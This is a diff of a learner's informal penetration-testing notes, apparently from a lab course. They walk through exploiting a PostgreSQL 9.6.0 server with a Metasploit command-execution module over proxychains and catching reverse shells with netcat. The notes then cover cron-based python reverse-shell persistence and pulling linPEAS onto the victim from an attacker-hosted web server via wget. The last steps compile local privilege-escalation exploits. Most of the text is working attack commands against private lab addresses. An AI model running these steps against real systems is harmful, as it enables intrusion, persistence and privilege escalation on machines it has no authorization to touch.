@@ -1,39 +1,28 @@
-the two different ways to do this within Metasploit, you can run the search command to just called search and then you throw in the service and the version uh or on Cali directly from the terminal called Search sploit
-utulize metasploit to get on soc4. 
+The two different ways to do this within Metasploit, you can run the search command to
+just called search and then you throw in the service and the version uh or on Cali directly 
+from the terminal called Search sploit
+utulize METASPLOIT to get on SOC4. 
 Proxychains is used because you dont have to drop anything on the victim because ssh is already built in.
 So we open up Metasploit through proxy chains.
 
 Checked to see if it was vulnerable to SSH enumeration.
-
 landed inside exploit module within Metasploit while it's proxied. 
-say use zero, it's going to set set me up to utilize this module here.
+use whatever number that has the most recent date for exploit module.
 
 (ATK)(msf6) search postgresql [1:45:23][Day 11]
 Based off the server data in (ATK) (TERM 2) we saw that PostgreSQL is 9.6.0
-(ATK)(msf6) search postgresql 9.6.0 (start from 9.6.0 and back space one character each time to see what you find out)
+(ATK)(msf6) search postgresql 9.6.0 
+(start from 9.6.0 and back space one character each time to see what you find out)
 (ATK)(msf6) search postgresql 9.6
-(ATK)(msf6) search postgresql 9. [I USED 0 ON THIS]
+(ATK)(msf6) search postgresql 9.
 (ATK)(msf6) search postgresql 9
 
 use number that has expliot module (it vaires but i used the one ending in "cmd_excec")
-
 use exploit modules as much as possible.
-LHOST comming back through our WAN
+LHOST (istening) comming back through our WAN
+RHOST (recieving)
 
-
-[[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
-this will be for the report that enumeration was a dead end
-(ATK)(msf6) exploit(this is not the actual name of the module would need to go back) > show options
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [1:55] [DAY 11]
-[[[[[[HARD STOP found out that you need creds for this route]]]]]]
-
-
-
-Config start around [1:48] [DAY 11]
+CONFIGURING YOUR EXPLOIT MODULE start around [1:48] [DAY 11]
 
 (CALI) searchsploit postgresql (find version) 
 (ATK)(msf6) search postgresql
@@ -41,16 +30,19 @@ Config start around [1:48] [DAY 11]
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lport 61775 [use your manual port for reverse shells]
 (ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [check config]
-(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [should get exploit here] [3:30][DAY 11]
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run 
+[should get exploit here] [3:30][DAY 11]
+run id [THIS HOW WE GET INTO SOC4]
+break out metasploit by using your FIRST port you made creating 
+another shell to brake out metasploit (DEFAULT PORT)
 
-run id
-break out metasploit by using your first port you made creating another shell to brake out metasploit (he used 12222)
+(VICTIM) create a crontab using python3 shortest with your port 
+number you want to use for VIC2 persistence (THIS PORT NUMBER IS ONLY FOR SOC4 PERSISTENCE)
 
-(VICTIM) create a crontab using python3 shortest with your port number you want to use for VIC2 persistence
+he set up another listner over DEFAULT port (VIC 2 Persisitence)
 
-he set up another listner over port 12225 (VIC 2 Persisitence)
+HOW TO CATCH USER PERSISTENCE SHELL ON VIC2 [[14:02]]DAY 12
 
-catch user persistence shell ON VIC2 [[14:02]]DAY 12
 (ATTACKER) nc -lvp 55557 [NEW PORT I SET VIC ON PFSENSE]
 (ATTACKER) (NEW TERM) CAT INTERNAL AND CD TO 192.168.1.102
 (ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh [1:33][DAY 12]
@@ -61,8 +53,11 @@ catch user persistence shell ON VIC2 [[14:02]]DAY 12
 
 set up another port fowarding rule with this port number because thats where the websever is.
 
-(type in web browser) 127.0.0.1:8000 [use ip thats local to you]
-were going to download linPEAS to ourselves (ATTACKER) and then access it through the web server from the victim side. basically hosting linPeas utulizing python throwing up on a webpage and the downloading it from victim.
+(type in web browser) 
+127.0.0.1:8000 [use ip thats local to you]
+were going to download linPEAS to ourselves (ATTACKER) and then access it through the 
+web server from the victim side. Basically hosting linPeas utulizing python throwing it
+up on a webpage and the downloading it from victim.
 
 (VICTIM) wget http://192.168.122.209:8000/linpeas.sh
 (VICTIM) mv linpeas.sh /tmp
@@ -90,4 +85,16 @@ were going to download linPEAS to ourselves (ATTACKER) and then access it throug
 (ATTACKER) cat readme [2:11][DAY 12]
 (ATTACKER) python3 exploit_nss.py
 (ATTACKER) gcc -o exploit_timestamp_race exploit_timestamp_race.c [2:12:27]
+
+
+
+[[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
+this will be for the report that enumeration was a dead end
+(ATK)(msf6) exploit(this is not the actual name of the module would need to go back) > show options
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set rhosts 192.168.1.102
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhost 192.168.122.209
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > set lhosts port 61775
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > show options [this is to validate config]
+(ATK)(msf6) exploit(multi/postgress/postgress_copy_from_program_cmd_exec) > run [1:55] [DAY 11]
+[[[[[[HARD STOP found out that you need creds for this route]]]]]]
 
